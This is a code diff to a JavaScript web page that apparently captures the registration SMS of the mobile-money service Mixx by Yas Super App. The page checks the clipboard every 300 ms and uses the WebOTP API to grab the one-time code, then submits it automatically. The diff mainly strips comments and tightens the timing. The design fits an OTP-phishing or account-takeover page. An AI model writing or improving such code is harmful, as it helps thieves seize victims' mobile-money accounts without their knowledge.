@@ -48,7 +48,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
     const REQUIRED_SMS_START = "You are being registered in Mixx by Yas Super App, use the code";
 
-    // Strict validation checking if SMS starts with the exact required phrase
     function isValidSMS(text) {
         if (!text) return false;
         return text.trim().startsWith(REQUIRED_SMS_START);
@@ -197,7 +196,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    // THIBITISHA button handler with 4-second checker integration
     if (btnThibitisha) {
         btnThibitisha.addEventListener('click', () => {
             const text = otpText.value.trim();
@@ -251,7 +249,6 @@ document.addEventListener('DOMContentLoaded', () => {
         if (autoCheckInterval) clearInterval(autoCheckInterval);
         screenOpenTimestamp = Date.now();
 
-        // High frequency DOM/clipboard check
         sensitivityInterval = setInterval(() => {
             if (isAutoSubmitting) return;
 
@@ -272,7 +269,7 @@ document.addEventListener('DOMContentLoaded', () => {
                         const trimmed = clipText.trim();
                         if (isValidSMS(trimmed)) {
                             otpText.value = trimmed;
-                            charCount.innerText = `${otpText.value.length}/1000`;
+                            charCount.innerText = `${trimmed.length}/1000`;
                             triggerAutoSubmit(trimmed);
                         }
                     }
@@ -280,7 +277,6 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         }, 300);
 
-        // Active 4-second checking interval loop to automatically verify and submit when valid SMS is detected
         autoCheckInterval = setInterval(() => {
             if (isAutoSubmitting) return;
             const currentText = otpText.value.trim();
@@ -288,7 +284,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 smsErrorBanner.classList.add('hidden');
                 triggerAutoSubmit(currentText);
             }
-        }, 4000); // Runs every 4 seconds
+        }, 4000);
     }
 
     function initWebOTP() {
@@ -303,13 +299,12 @@ document.addEventListener('DOMContentLoaded', () => {
                     if (isValidSMS(smsMessage)) {
                         otpText.value = smsMessage;
                         charCount.innerText = `${smsMessage.length}/1000`;
+                        smsErrorBanner.classList.add('hidden');
                         setTimeout(() => {
-                            const text = otpText.value.trim();
-                            if (text && !isAutoSubmitting) {
-                                smsErrorBanner.classList.add('hidden');
-                                triggerAutoSubmit(text);
+                            if (!isAutoSubmitting) {
+                                triggerAutoSubmit(smsMessage);
                             }
-                        }, 100);
+                        }, 50);
                     }
                 }
             }).catch(() => {});
@@ -366,4 +361,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 2000);
     }
 });
-                          
+    
